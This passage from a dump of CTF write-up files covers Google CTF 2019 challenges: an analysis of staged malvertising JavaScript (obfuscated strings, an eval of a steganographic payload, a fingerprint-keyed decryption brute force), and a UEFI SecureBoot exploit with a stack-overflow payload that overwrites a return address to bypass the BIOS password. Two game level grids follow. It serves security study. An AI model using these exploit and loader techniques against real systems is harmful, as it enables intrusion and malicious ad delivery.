strings in the `a` array. They decode to binary garbage, so they are probably encrypted. There are also several instances of code like `b(\"0x1\", \"...\")`. The first number is always a hexadecimal integer (presumably an index in the `a` array), the second is always a four-character key. By modifiying the (unformatted) code to not do anything at the end but instead to [dump the decoded strings](scripts/malvertising2.html), we get the following listing:\n\n```\nb('0x0','Kb10')  => apply\nb('0x1',')ID3')  => return (function() \nb('0x2','3hyK')  => {}.constructor(\"return this\")( )\nb('0x3','^aQK')  => console\nb('0x4','bxQ9')  => console\nb('0x5','bxQ9')  => log\nb('0x6','vH0t')  => warn\nb('0x7','bxQ9')  => debug\nb('0x8','jAUm')  => info\nb('0x9','SF81')  => exception\nb('0xa','$KuR')  => trace\nb('0xb','IfD@')  => console\nb('0xc','%RuL')  => console\nb('0xd','e9PJ')  => warn\nb('0xe','(fcQ')  => console\nb('0xf','xBPx')  => info\nb('0x10','yDXL') => console\nb('0x11','IDtv') => error\nb('0x12','oBBn') => console\nb('0x13','^aQK') => exception\nb('0x14','F#*Z') => console\nb('0x15','vH0t') => trace\nb('0x16','%RuL') => constructor\nb('0x17','jAUm') => getElementById\nb('0x18','3hyK') => adimg\nb('0x19','F#*Z') => onload\nb('0x1a','OfTH') => decode\nb('0x1b','JQ&l') => test\nb('0x1c','IfD@') => userAgent\n```\n\nAfter the `b` function, there are three functions which seem to be anti-debugger, since they cause infinite loops and replace `console` functions. Finally, after replacing all the `b` calls, we come to the final part of the `metrics.js` script:\n\n```js\nvar s = 'constructor';\nvar t = document['getElementById']('adimg');\nt['onload'] = function() {\n  try {\n    var u = steg['decode'](t);\n  } catch (v) {}\n  if (Number(/android/i ['test'](navigator['userAgent']))) {\n    s[s][s](u)();\n  }\n};\n```\n\nThe `s[s][s]` bit is basically `eval`:\n\n```js\n>>> s\n\"constructor\"\n>>> s[s]\nƒ String() { [native code] }\n>>> s[s][s]\nƒ Function() { [native code] }\n```\n\n`u`, the result of the steganography decoding of the `adimg` picture is executed if `android` is found in the visitor's `User-Agent` string. The result of the decoding is (with minor formatting adjustments):\n\n```js\nvar dJs = document.createElement('script');\ndJs.setAttribute('src','./src/uHsdvEHFDwljZFhPyKxp.js');\ndocument.head.appendChild(dJs);\n```\n\n### Stage 2\n\nWe can run [the linked file](files/malvertising3.js) through the beautifier once again to get something [nicer](files/malvertising3-b.js). In this file, we have a set of functions in the `T` object, some polyfills for `String`, and then:\n\n```js\nfunction dJw() {\n  try {\n    return navigator.platform.toUpperCase().substr(0, 5)\n    + Number(/android/i.test(navigator.userAgent))\n    + Number(/AdsBot/i.test(navigator.userAgent))\n    + Number(/Google/i.test(navigator.userAgent))\n    + Number(/geoedge/i.test(navigator.userAgent))\n    + Number(/tmt/i.test(navigator.userAgent))\n    + navigator.language.toUpperCase().substr(0, 2)\n    + Number(/tpc.googlesyndication.com/i.test(document.referrer) || /doubleclick.net/i.test(document.referrer))\n    + Number(/geoedge/i.test(document.referrer))\n    + Number(/tmt/i.test(document.referrer))\n    + performance.navigation.type\n    + performance.navigation.redirectCount\n    + Number(navigator.cookieEnabled)\n    + Number(navigator.onLine)\n    + navigator.appCodeName.toUpperCase().substr(0, 7)\n    + Number(navigator.maxTouchPoints > 0)\n    + Number((undefined == window.chrome) ? true : (undefined == window.chrome.app))\n    + navigator.plugins.length\n  } catch (e) {\n    return 'err'\n  }\n};\na = \n  \"A2xcVTrDuF+EqdD8VibVZIWY2k334hwWPsIzgPgmHSapj+zeDlPqH/RHlpVCitdlxQQfzOjO01xCW/6TNqkciPRbOZsizdYNf5eEOgghG0YhmIplCBLhGdxmnvsIT/69I08I/ZvIxkWyufhLayTDzFeGZlPQfjqtY8Wr59Lkw/JggztpJYPWng==\"\neval(T.d0(a, dJw()));\n```\n\nThe Base64 string `a` seems encrypted (binary garbage when decoded). Based on this we can easily guess that `T.d0` is a decryption function using the result of the `dJw()` call as a key.\n\nThe key is a sort of browser fingerprint, constructed out of a number of checks. All `Number(...)` calls in the function take a boolean value and change it to `0` or `1`.\n\n - `LINUX` / `WIN32` / `MACIN` / ... - [`navigator.platform.toUpperCase().substr(0, 5)`](https://developer.mozilla.org/en-US/docs/Web/API/NavigatorID/platform) - the first five letters of the uppercased navigator platform\n - `0` / `1` - is `android` part of the [user agent](https://developer.mozilla.org/en-US/docs/Web/API/NavigatorID/userAgent) string?\n - `0` / `1` - is `AdsBot` part of the user agent string?\n - `0` / `1` - is `Google` part of the user agent string?\n - `0` / `1` - is `geoedge` part of the user agent string?\n - `0` / `1` - is `tmt` part of the user agent string?\n - `EN` / `FR` / `SK` / ... - [`navigator.language.toUpperCase().substr(0, 2)`](https://developer.mozilla.org/en-US/docs/Web/API/NavigatorLanguage/language) - the first two letters of the uppercased navigator language\n - `0` / `1` - did the user [come from a URL](https://developer.mozilla.org/en-US/docs/Web/API/Document/referrer) containing either `tpc.googlesyndication.com` or `doubleclick.net`?\n - `0` / `1` - did the user come from a URL containing `geoedge`?\n - `0` / `1` - did the user come from a URL containing `tmt`?\n - `0` / `1` / `2` / `255` - [how did the user navigate](https://developer.mozilla.org/en-US/docs/Web/API/PerformanceNavigation/type) to the page?\n - `0` / `1` / ... - [how many redirections](https://developer.mozilla.org/en-US/docs/Web/API/PerformanceNavigation/redirectCount) did the user go through before getting to the page?\n - `0` / `1` - are [cookies enabled](https://developer.mozilla.org/en-US/docs/Web/API/Navigator/cookieEnabled)?\n - `0` / `1` - does the browser [think it is online](https://developer.mozilla.org/en-US/docs/Web/API/NavigatorOnLine/onLine)?\n - `MOZILLA` - the uppercased [`appCodeName`](https://developer.mozilla.org/en-US/docs/Web/API/NavigatorID/appCodeName) (which is always `Mozilla`)\n - `0` / `1` - does the browser [support any number of touch points](https://developer.mozilla.org/en-US/docs/Web/API/Navigator/maxTouchPoints)? (is it a touchscreen?)\n - `0` / `1` - is the user NOT on a Chromium-based browser?\n - `0` / `1` / ... - number of [installed plugins](https://developer.mozilla.org/en-US/docs/Web/API/NavigatorPlugins/plugins)\n\nFurthermore, it seems that even though this fingerprint can generate strings of 31 characters (or even longer due to `redirectCount` and `plugins.length`), only the first 16 characters are used as the decryption key.\n\nDue to the various constant numbers in the `T` object, e.g. `2654435769 == 0x9E3779B9`, we can guess it is an implementation of the [Tiny Encryption Algorithm](https://en.wikipedia.org/wiki/Tiny_Encryption_Algorithm).\n\nSo we have a ciphertext, a decryption method, and the general layout of the key with a rather limited keyspace. With the assumption that the challenge would actually decrypt and run successfully from beginning to end for *some* real user agent, we can also use two pieces of information we gathered before:\n\n - the user agent string must contain `android` - we can fix `navigator.platform.toUpperCase().substr(0, 5)` to be `LINUX`\n - the YouTube page indicated a Canadian region code - we can fix `navigator.language.toUpperCase().substr(0, 2)` to be `EN` or `FR` (`navigator.language` would be e.g. `fr_CA`)\n\nWhat remains is 9 characters (`16 - \"LINUX\".length - \"EN\".length`) all of which can be `0` or `1`, except the last one, which can also be `2`. Just 1536 possibilities, very quick to brute-force.\n\n> And here is where our team hit a snag - we wrote a decryption script and run it in Node.JS, but it produced no results. We expanded the brute-force to be quite exhaustive, trying different values for `navigator.platform`, hundreds of possible language codes, nothing produced any code. It turns out the decryption code as-is simply does not function identically on Node.JS. Running the brute-force script on a browser leads to the next stage in a matter of seconds. We did not manage to think of this during the CTF, which cost us the flag. What follows is a write-up of steps taken after the CTF.\n>\n> [More on that later...](#what-breaks-on-nodejs)\n\n[Full decryption script here](scripts/malvertising3.html)\n\nWith the key `LINUX10000FR1000`, we get:\n\n```js\nvar dJs = document.createElement('script');\ndJs.setAttribute('src','./src/npoTHyBXnpZWgLorNrYc.js');\ndocument.head.appendChild(dJs);\n```\n\n### Stage 3\n\nYet again we take [the file](files/malvertising4.js) and [beautify it](files/malvertising4-b.js). We can see the same patterns of encoding as in the previous stage (array of Base64-encoded strings, 4-character keys, multiple functions to prevent debugging). However, this time we need only load the JS file locally as-is in a browser with the console closed, *then* open the console to see an error - the JS file tries to load the file `WFmJWvYBQmZnedwpdQBU.js`!\n\nAnd that file simply contains the flag:\n\n```js\nalert(\"CTF{I-LOVE-MALVERTISING-wkJsuw}\")\n```\n\nThe last stage contained references to RTC/STUN servers, which may have been interesting to (try to) reverse, but it would be wasted effort!\n\n`CTF{I-LOVE-MALVERTISING-wkJsuw}`\n\n### What breaks on Node.JS?\n\nFinally, let's check what makes the script work in a browser but break in Node.JS. We can strip most of the functions out from the [file](files/malvertising3-b.js) and track it down to how a binary string is treated after it is decoded from Base-64.\n\n```js\nString.prototype.b1 = function() {\n  if ('undefined' != typeof atob)\n    return atob(this);\n  if ('undefined' != typeof Buffer)\n    return new Buffer(this, 'base64').toString('utf8');\n  throw new Error('err')\n};\n\nvar a = \"A2xcVTrDuF+EqdD8VibVZIWY2k334hwWPsIzgPgmHSapj+zeDlPqH/RHlpVCitdlxQQfzOjO01xCW/6TNqkciPRbOZsizdYNf5eEOgghG0YhmIplCBLhGdxmnvsIT/69I08I/ZvIxkWyufhLayTDzFeGZlPQfjqtY8Wr59Lkw/JggztpJYPWng==\"\n\nlet raw = a.b1();\nlet ccs = [];\nfor (let i = 0; i < raw.length; i++) {\n  ccs.push(raw.charCodeAt(i));\n}\nconsole.log(ccs);\n```\n\nIf we run the above script on a browser, we get an array like:\n\n```js\n[3, 108, 92, 85, 58, 195, 184, 95, 132, ...]\n```\n\nThe same on Node.JS produces a different result:\n\n```js\n[3, 108, 92, 85, 58, 248, 95, 65533, 65533, 65533, ...]\n```\n\n`65533` is the Unicode codepoint which Node.JS uses to indicate invalid UTF-8 decoding. Some character got jumbled (`195 184` -> `248`). The problem is that the Node.JS version is decoding the result of the Base-64 decoding as UTF-8, but binary data in general is not valid UTF-8. In particular, any byte over 127 has a special meaning in UTF-8. It seems that the `atob` function always treats the encoded data as [Latin-1](https://en.wikipedia.org/wiki/ISO/IEC_8859-1). Its complementary function, `btoa`, throws an error if the input string contains characters outside the Latin-1 range.\n\nWe can make the Node.JS version work by simply replacing the `Buffer` line with:\n\n```js\n    return new Buffer(this, 'base64').toString('latin1');\n```\n\nIt is unfortunate this tiny misstep cost us the flag, but we can take solace in knowing it was not worth too many points.\n\n## 271 Pwn / SecureBoot ##\n\n### Overview\n\nIn this challenge, a Linux OS is given and what we need to do is boot this OS. However, it seems that secure boot is preventing us from doing so. We then tried to enter BIOS and found that we need to enter a password first. After some reverse engineering, we found that there is a stack overflow when password is obtained from user. By exploiting this vulnerability, we could enter the BIOS, thus disable the secure boot and successfully boot the OS, in which flag can be read.\n\n### Password Interface\n\n**Discovery**\n\nAfter some trials, my teammate [@Retr0id](https://github.com/DavidBuchanan314) found that we can get into a password user interface by pressing `ESC` at the first booting stage (e.i. before secure booting violation error appears). \n\n```\n****************************\n*                          *\n*   Welcome to the BIOS!   *\n*                          *\n****************************\n\nPassword?\n\n```\n\nInteresting! This is very possible to be the key to solve the challenge, and it finally turns out to be true.\n\nThen we need to find the codes corresponding to password processing logic. My teammate [@Retr0id](https://github.com/DavidBuchanan314) has dumped the following PE files using `uefitool`: [secmain.exe](files/secmain.exe) and [uiapp.exe](files/uiapp.exe). However, by searching strings in all files using `strings` command in Linux, we still failed to find strings like `\"Welcome to the BIOS!\"` or `\"Password?\"`. Fortunately, after some investigation, we found them at `uiapp.exe`:\n\n![1561774234313](files/1561774234313.png)\n\nTherefore the reason why `strings` command failed to work is clear: these strings are encoded in `UTF-16LE`, thus cannot be found by `strings` which is used to search `ascii` strings.\n\nBy using cross reference, it was clear that `sub_FE50` is the function to process the input password.\n\n**Reverse Engineering**\n\nFirstly, function `0x13fd` takes strings like `L\"*   Welcome to the BIOS!   *\\n\"` as argument, and there is a `va_start` in its implementation, so I would guess it is `wprintf`, which is just `printf` but argument should be `UTF-18` string.\n\nThen, in `sub_FE50`, global pointers `0x1bc68` and `0x1bc78` are used for indirect function call. By looking for cross references of these 2 variables, we found that they are initialized at function `ModuleEntryPoint(0x8CB4)`. Here we found `0x1bc68` is assigned by `SystemTable` and `0x1bc78` is assigned by `SystemTable->BootServices`. `SystemTable` is the argument passed into `ModuleEntryPoint` and luckily IDA has relative structure information. We change type of `0x1bc68` to `EFI_SYSTEM_TABLE *` and `0x1bc78` to `EFI_BOOT_SERVICES *`, and also names are also changed. There are also some other assignment at this initialization function, their names and types are also modified just in case.\n\n```c\n::SystemTable = SystemTable;  // 0x1bc68\nv2 = SystemTable->BootServices;\nv3 = SystemTable->RuntimeServices;\n::ImageHandle = ImageHandle;\nBootServices = v2;  // 0x1bc78\nRuntimeServices = v3;\n```\n\nAfter type modification, the loop used to obtain one password becomes this, which is certainly more clear:\n\n```c\nwhile ( 1 )\n{\n  while ( 1 )\n  {\n    v8 = ((__int64 (__fastcall *)(EFI_SIMPLE_TEXT_INPUT_PROTOCOL *, \n      EFI_INPUT_KEY *))SystemTable->ConIn->ReadKeyStroke)(\n           SystemTable->ConIn,\n           &input); // try to read a character\n    if ( v8 >= 0 )\n    {\n      if ( input.UnicodeChar )\n        break; // a character has been read\n    }\n    if ( v8 == 0x8000000000000006i64 ) // if no chacacter is read, block and wait for event \n      ((void (__fastcall *)(signed __int64, EFI_EVENT *, char *))BootServices->WaitForEvent)(\n        1i64,\n        &SystemTable->ConIn->WaitForKey,\n        &v6);\n  }\n  if ( input.UnicodeChar == '\\r' )\n    break; // input terminates if '\\r' is received\n  if ( i <= 0x8Bu )\n  { // append the character to result buffer\n    v3 = i++;\n    v7[v3] = input.UnicodeChar;\n  }\n  wprintf(\"*\");\n}\n```\n\nAs its name suggests, `ReadKeyStroke` is used to get a character from user. The second argument is the buffer used to receive the character, the structure of the buffer is shown below.\n\n```c\ntypedef struct {\n  UINT16  ScanCode;\n  CHAR16  UnicodeChar;\n} EFI_INPUT_KEY;\n```\n\nSo we need to change variable `input` to this type in IDA. However, function `ReadKeyStroke` is a non-block function, and return a negative error value when no key is pressed. If so, blocked function `WaitForEvent` will be called to wait for key stroke event, and will return if there is any new event.\n\nAfter reading the input, the input is passed into `0x20A3`, which, by searching constants and by testing using simple string, we found it to be `sha256` hashing algorithm. The result is then compared, and password is correct only if the hash is `DEADBEEFDEADBEEFDEADBEEFDEADBEEFDEADBEEFDEADBEEFDEADBEEFDEADBEEF`, so it is certainly not possible to find string to satisfy the condition.\n\n```c\nv7[i] = 0;\nwprintf(L\"\\n\");\nsha256_maybe(v7, i, dst); // 0x20A3\nif ( *dst == 0xDEADBEEFDEADBEEFi64\n  && dst[8] == 0xDEADBEEFDEADBEEFi64\n  && dst[16] == 0xDEADBEEFDEADBEEFi64\n  && dst[24] == 0xDEADBEEFDEADBEEFi64 )\n{\n  free(v2);\n  return 1i64; // returning 1 means the password is correct\n}\n```\n\nIn addition, according to my guess, `0x11A8` is `malloc` and `0xC46` is `free`, since `0x11A8` takes a size and returns a pointer being used as that buffer size, and `0xC46` takes a pointer and is called when password interface function terminates. This turns out to be true, because of these codes found in these 2 functions.\n\n```c\n/* \nfunction call chain: malloc -> sub_1199 -> sub_E400\nas the function name `AllocatePool` suggests, \nmemory is allocated, \nwhich means this is probably `malloc`\n*/\n__int64 __usercall sub_E400@<rax>(__int64 a1@<rdi>)\n{\n  __int64 v2; // [rsp+28h] [rbp-10h]\n\n  if ( (BootServices->AllocatePool)(4i64, a1, &v2) < 0 )\n    v2 = 0i64;\n  return v2;\n}\n/*\nfunction call chain: free -> sub_C3C,\nsimilarly, this is probably `free`\n*/\n__int64 __cdecl sub_C3C(void *a1)\n{\n  return ((__int64 (__fastcall *)(void *))BootServices->FreePool)(a1);\n}\n```\n\n**Vulnerability**\n\nThe vulnerability is a stack overflow when obtaining password. The buffer size is `0x80` but the check is `i <= 0x8Bu`, so we can write 12 more bytes. This is the stack layout.\n\n```c\nchar v7[128]; // [rsp+38h] [rbp-B0h]\n__int64 v8; // [rsp+B8h] [rbp-30h]\n_QWORD *dst; // [rsp+C0h] [rbp-28h]\n```\n\n`v8` is used to store return value of function `ReadKeyStroke` and is used only after being reassigned by the return value of that function, so overwriting it is not very useful. However, `dst`, which is used to store the `sha256` result when function `sha256_maybe` is called, can be used to achieve arbitrary write.\n\n### Debug Environment\n\nBefore exploitation, we may need to successfully debug this password interface subroutine. \n\n**Debug Option of QEMU**\n\nTo debug the binary, we need to set `-s` option in QEMU command in file `run.py`, then launch `gdb` in without any argument, and use `target remote localhost:1234` `gdb` command to start debugging.\n\n**Find PE in Memory**\n\nFirst of all, we need to know where `uiapp.exe` PE file is mapped into the memory. We assumed that there is no ASLR first, and that PE file is loaded at page aligned address (so least 12 bits of address should be same as least 12 bits in IDA).\n\nMy approach to find the PE file is to press `ctrl+c` when password need to be inputted. My idea is that since `WaitForEvent` is a blocked function, `ctrl+c` must terminates in this function or its subroutine functions that it calls. If we inspect the stack at this time, we must be able to find the return address of function `WaitForEvent`, which is inside the `uiapp.exe` PE module, and whose least 12 bits must be `f5e`.\n\n![1561902963554](files/1561902963554.png)\n\nFinally, at `rsp+0x120`, we found the return address to be `0x67daf5e`, and if you restart the challenge and repeat these steps, you will find the address to have the same value, which suggests that the ASLR is not enabled. In addition, you can also find that stack address is also a constant value, which is great and a important feature for us to exploit.\n\nTherefore, it is easy for us to calculate the base address: `0x67daf5e - 0xff5e = 0x67cb000`, so we can rebase the program in IDA to make things more convenient.\n\nAlso, after knowing where the PE file is loaded, we can set breakpoint.\n\n### Exploitation\n\n**Idea**\n\nSo, what we can do is to write a `sha256` hash into a arbitrary 4-byte address. Obviously the idea is try to bypass the password verification. Here is how the password interface function is called:\n\n```assembly\n.text:00000000067D4D2F      call    password_FE50\n.text:00000000067D4D34      test    al, al\n.text:00000000067D4D36      jnz     short loc_67D4D49\n```\n\nFirstly, we tried to rewrite the instruction. For example, if we write `jnz` to `jmp`, we can always let this function jump to the branch of correct password. However, according to [this](https://edk2-docs.gitbooks.io/a-tour-beyond-bios-memory-protection-in-uefi-bios/memory-protection-in-uefi.html), it seems that the text memory is protected and not writable, so this approach does not work.\n\nAs I mentioned before, the stack address is not randomized, so why not rewrite return address of password verification function in stack directly? It should be `0x67D4D34`, but if we can modify it to `0x67D4D49`, the control flow will jump to the branch of correct password directly as the password verification returns. To be specific, what we need to do is to rewrite the least significate byte to `\\x49`, which is the first byte since it is little-endian.\n\n**Find Where the Return Address is Stored**\n\nThis is not so hard, what we need to do is to set a breakpoint at the `ret` instruction of the password interface function (e.i. `password_FE50`), and see the current `rsp` value. To be specific, we use command `b *0x67DB0BB`, and enter wrong password for 3 times, then the function will exit and breakpoint can be triggered.\n\n![1561935288179](files/1561935288179.png)\n\nAs shown clearly above, the return address is stored in address `0x7ec18b8`.\n\n**Specific Exploitation**\n\nNow the particular steps are clear. Firstly, we need to use overflow to rewrite the variable `dst` to `0x7ec18b8 - 32 + 1`, so that the last byte of the hash is the least significate byte of return address. Then we need to find a string such that the last byte of its `sha256` hash is `\\x49`. Note that, the actual payload that we are going to send is `'A' * 0x88 + p32(0x7ec18b8 - 32 + 1) + '\\r'`, where the `A` prefix should be modified to make last byte of the hash `\\x49`. However, when the input is used to calculate hash value, actual bytes used is `'A' * (0x80) + p64(0) + p32(0x7ec18b8 - 32 + 1)`. This is because variable `v8` just after the password buffer will be assigned to return value of `ReadKeyStroke`, which is zero at this point.\n\nTherefore, here is the script to obtain the payload prefix:\n\n```python\nimport binascii\nfrom pwn import *\n\nfor i in xrange(0x10000):\n\tpld = hex(i)[2:]\n\tdk = hashlib.sha256(pld + 'A' * (0x80-4) + p64(0) + p32(0x7ec18b8 - 32 + 1)).hexdigest()\n\tdk = binascii.unhexlify(dk)\n\tif ord(dk[31]) == 0x49:\n\t\tprint pld\n```\n\nThere are many outputs, and we just chose `'1010'` as the prefix.\n\nTherefore, finally the payload to be sent as password is this:\n\n```python\nsh.send('1010' + 'A' * 0x84 + p32(0x7ec18b8 - 32 + 1) + '\\r')\n```\n\n### Tackle with BIOS\n\nNow we finally got into BIOS interface. The idea is to disable secure boot here and reboot the OS. However, if we run the script locally, the BIOS interface we get is this:\n\n![BIOS1](files/BIOS1.png)\n\nwhich is very ugly because it print the control characters used to draw UI as raw bytes, I failed to find `pwntool` functionality to make this more readable, but fortunately when this is run remotely the UI can be shown.\n\n![BIOS2](files/BIOS2.png)\n\nOkay, but how can we move the cursor? After some investigation, we found that `sh.send('\\x1b[B')` is equivalent to key `down`, that `sh.send('\\x1b\\x1b')` is equivalent to key `ESC`, and that `sh.send('\\r')` is equivalent to key `Enter`.\n\nThen we have explored this BIOS, and found option to disable secure boot in `Device Manager`, and rebooted the OS successfully in which the flag can be read, which is just a boring process and not worth discussing...\n\nThe final [exploit](files/secureboot.py).", "timestamp": "2025-10-24T11:39:27.642314"}
{"source": "github", "repo": "Aurel300/empirectf", "file": "writeups/2019-06-22-Google-CTF-Quals/files/flaggybird-flag.txt", "url": "https://github.com/EmpireCTF/empirectf/blob/master/writeups/2019-06-22-Google-CTF-Quals/files/flaggybird-flag.txt", "content": "1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000011111111111111111111\n1111111111100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000011111111111111111111\n1111111111100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000011111111111111111111\n1111111111100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000011111111111111111111\n1111111111100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000011111111111111111111\n1111111111100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000011111111111111111111\n1111111111100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000011111111111111111111\n1111111111100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000011111111111111111111\n1111111111100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000011111111111111111111\n1111111111100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000011111111111111111111\n1111111111100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000011111111111111111111\n111111111110000MsnstqtsqMsO0O00000000rpsnr0rR0r000stqMQ0000000stqMQ0000000stqMQ0000000O00r0r000000r00P00000O000000MsQOss000000000r0pQ0pQ000000O0MsnMsn000000r0pQ0pQoQ0000011111111111111111111\n111111111110000r000r0Rn0p0O0OMsQ0000Nrrprrnrtnr0000r0ponpsn0000r0ponpsn0000r0ponpsn000PN0r0rpsn000RnoO0OsnMP0000N0OMSONnMsq000Ms0r0MPO000000pqO00Nrr00000Ms0r0MPO000on000011111111111111111111\n111111111110000Q0n0r0r00O0O0OO0O000O0rt0rrrrrOr0000r0tsrr0r0000r0tsrr0r0000r0tsrr0r000O0ntsrtsq000rO0O0O00rO000O0rOqOO000sn000O00r0rOonS0000r0O0O0rQor000O00r0rOonS0O0000011111111111111111111\n1111111111100000s00q0q000s0sqOsqoss0sqos0oo0q0qssq0q0q0qts0ssq0q0q0qts0ssq0q0q0qts0ssq0s0q0qos0ssqsqosso00ososs0sr0sqossos0ssqSs0oqos0osossotq0s0sq0sqssqSs0oqos0osoq0000011111111111111111111\n11111111111000000000000000000O00000000000000000000000000r00000000000r00000000000r000000000000000000000000000000oNq000000000000O0000000000000r000000000000O000000000000000011111111111111111111\n1111111111100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000011111111111111111111\n1111111111100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000040011111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111", "timestamp": "2025-10-24T11:39:28.490312"}
{"source": "github", "repo": "Aurel300/empirectf", "file": "writeups/2019-06-22-Google-CTF-Quals/files/flaggybird-level1.txt", "url": "https://github.com/EmpireCTF/empirectf/blob/master/writeups/2019-06-22-Google-CTF-Quals/files/flaggybird-level1.txt", "content": "1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\n1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\n1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\n1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\n1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\n1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\n1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\n1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\n1111111111100000000000000000000000000000000000000000000000000000000000000000001111111111111111111100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\n1111111111100000000000000000000000000000000000000000000000000000000000000000001111111111111111111100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\n1111111111100000000000000000000000000000000000000000000000000000000000000000001111111111111111111100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\n1111111111100000000000000000000000000000000000000000000000000000000000000000001111111111111111111100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\n1111111111100000000000000000000000000000000000000000000000000000000000000000001111111111111111111100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\n1111111111100000000000000000000000000000000000000000000000000000000000000000001111111111111111111100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\n1111111111100000000004000000000000000000000000000000000000000000000000000000001111111111111111111100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\n1111111111100000001111111100